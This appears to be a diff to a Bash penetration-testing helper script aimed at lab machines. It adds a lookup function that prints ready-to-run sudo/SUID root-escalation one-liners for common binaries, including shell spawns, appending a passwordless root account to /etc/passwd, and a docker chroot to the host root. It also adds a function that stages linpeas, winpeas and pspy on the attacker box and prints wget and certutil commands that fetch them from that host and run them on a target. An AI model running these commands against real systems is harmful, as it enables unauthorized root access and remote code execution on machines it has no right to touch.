@@ -196,6 +196,90 @@ LOLBAS (Windows) — https://lolbas-project.github.io
 EOF
 }
 
+# ── Phase D: GTFOBins one-liner resolver ────────────────────────────────────
+# Given a binary name, print the ready-to-run sudo/SUID escalation one-liner(s).
+# Covers the binaries that actually show up in `sudo -l` / SUID sweeps on labs.
+privesc_gtfo_resolve() {
+    local bin; bin=$(basename "${1,,}")
+    case "$bin" in
+        find)     echo "sudo find . -exec /bin/sh \\; -quit    |SUID| find . -exec /bin/sh -p \\; -quit" ;;
+        vim|vi)   echo "sudo vim -c ':!/bin/sh'                 |SUID| vim -c ':py3 import os; os.setuid(0); os.execl(\"/bin/sh\",\"sh\",\"-p\")'" ;;
+        nano)     echo "sudo nano  →  ^R^X then: reset; sh 1>&0 2>&0" ;;
+        less|more)echo "sudo less /etc/profile  →  type '!/bin/sh'" ;;
+        awk|gawk) echo "sudo awk 'BEGIN {system(\"/bin/sh\")}'" ;;
+        man)      echo "sudo man man  →  '!/bin/sh'" ;;
+        env)      echo "sudo env /bin/sh" ;;
+        python*|python3)  echo "sudo python3 -c 'import os; os.system(\"/bin/sh\")'   |cap_setuid| python3 -c 'import os;os.setuid(0);os.system(\"/bin/sh\")'" ;;
+        perl)     echo "sudo perl -e 'exec \"/bin/sh\";'" ;;
+        ruby)     echo "sudo ruby -e 'exec \"/bin/sh\"'" ;;
+        node)     echo "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'" ;;
+        tar)      echo "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh" ;;
+        zip)      echo "sudo zip /tmp/x.zip /etc/hosts -T -TT 'sh #'" ;;
+        nmap)     echo "sudo nmap --interactive  →  '!sh'  (old nmap only)  |else| echo 'os.execute(\"/bin/sh\")' > /tmp/x.nse; sudo nmap --script=/tmp/x.nse" ;;
+        bash|sh)  echo "SUID: ./bash -p    |sudo| sudo bash" ;;
+        cp)       echo "SUID cp: overwrite /etc/passwd with a root:\$(openssl passwd) line, or copy a SUID shell" ;;
+        dd)       echo "SUID dd: echo 'root2::0:0::/root:/bin/bash' | dd of=/etc/passwd oflag=append conv=notrunc" ;;
+        wget|curl)echo "sudo ${bin}: fetch a crafted /etc/passwd or shadow, then overwrite (needs writable target)" ;;
+        systemctl)echo "sudo systemctl: write a malicious .service running /bin/sh, then start it" ;;
+        docker)   echo "docker run -v /:/mnt --rm -it alpine chroot /mnt sh   (docker group = root)" ;;
+        mysql)    echo "sudo mysql -e '\\! /bin/sh'" ;;
+        gdb)      echo "sudo gdb -nx -ex '!sh' -ex quit   |cap| gdb -nx -ex 'python import os;os.setuid(0)' -ex '!sh'" ;;
+        git)      echo "sudo git -p help  →  '!/bin/sh'   |else| sudo git branch --help then '!sh'" ;;
+        ftp)      echo "sudo ftp  →  '!/bin/sh'" ;;
+        *)        echo "" ;;
+    esac
+}
+
+# Interactive: look up whatever the operator found in `sudo -l` / SUID sweep.
+privesc_gtfo_interactive() {
+    [[ "${INTERACTIVE:-true}" == "true" ]] || return 0
+    declare -F _sh_ask >/dev/null || return 0
+    local bin ans
+    while true; do
+        bin=$(_sh_ask "GTFOBins lookup — binary name (Enter to skip)" "")
+        [[ -z "$bin" ]] && return 0
+        ans=$(privesc_gtfo_resolve "$bin")
+        if [[ -n "$ans" ]]; then
+            echo -e "  ${GREEN}${bin}:${NC} ${ans}"
+        else
+            echo -e "  ${YELLOW}No canned one-liner for '${bin}'${NC} → https://gtfobins.github.io/gtfobins/${bin}/"
+        fi
+    done
+}
+
+# ── Phase D: auto-stage local peas/pspy binaries into the serve dir ─────────
+# Finds linpeas/winpeas/pspy/lse on the attacker box (POST_TOOLS_DIRS + PATH),
+# copies them where the file server can reach them, and prints exact fetch cmds.
+privesc_stage_peass() {
+    local serve_dir="$1" lhost="$2"
+    mkdir -p "$serve_dir" 2>/dev/null
+    local -a wanted=(linpeas.sh winPEASx64.exe winPEAS.bat pspy64 pspy32 lse.sh PrivescCheck.ps1 linux-exploit-suggester.sh)
+    local staged=0 name found
+    local -a search_dirs
+    IFS=' ' read -ra search_dirs <<< "${POST_TOOLS_DIRS:-}"
+    for name in "${wanted[@]}"; do
+        found=""
+        local d
+        for d in "${search_dirs[@]}"; do
+            [[ -f "${d}/${name}" ]] && { found="${d}/${name}"; break; }
+        done
+        [[ -z "$found" ]] && found=$(command -v "$name" 2>/dev/null)
+        if [[ -n "$found" && -f "$found" ]]; then
+            cp -f "$found" "${serve_dir}/${name}" 2>/dev/null && { staged=$((staged+1)); echo -e "  ${GREEN}✓${NC} staged ${name}"; }
+        fi
+    done
+    if (( staged > 0 )); then
+        log_success "${staged} tool(s) staged → ${serve_dir}"
+        echo -e "  ${BOLD}Serve:${NC} python3 -m http.server 8000 --directory ${serve_dir}"
+        echo -e "  ${BOLD}Fetch (Linux):${NC}   wget http://${lhost}:8000/linpeas.sh -O /tmp/lp.sh && sh /tmp/lp.sh"
+        echo -e "  ${BOLD}Fetch (Windows):${NC} certutil -urlcache -split -f http://${lhost}:8000/winPEASx64.exe wp.exe & wp.exe"
+    else
+        log_info "No local peas/pspy binaries found in POST_TOOLS_DIRS or PATH — sheets still list fetch URLs."
+        echo -e "  ${DIM}Get them: https://github.com/peass-ng/PEASS-ng/releases  ·  https://github.com/DominicBreuker/pspy${NC}"
+    fi
+    return 0
+}
+
 run_privesc() {
     local ip="$1"
     local result_dir="$2"
@@ -246,6 +330,14 @@ run_privesc() {
         windows) log_info "Primary path looks ${BOLD}Windows${NC} — start with windows_privesc.txt" ;;
         *)       log_info "OS undetermined — both cheatsheets generated." ;;
     esac
+
+    # ── 2b. Auto-stage peas/pspy into the shell-handler serve dir ──
+    sub_header "Stage Post-Exploitation Tools"
+    local serve_dir="${result_dir}/shells/serve"
+    privesc_stage_peass "$serve_dir" "$lhost"
+
+    # ── 2c. Interactive GTFOBins resolver ──
+    privesc_gtfo_interactive
 
     # ── 3. Summary ──
     {
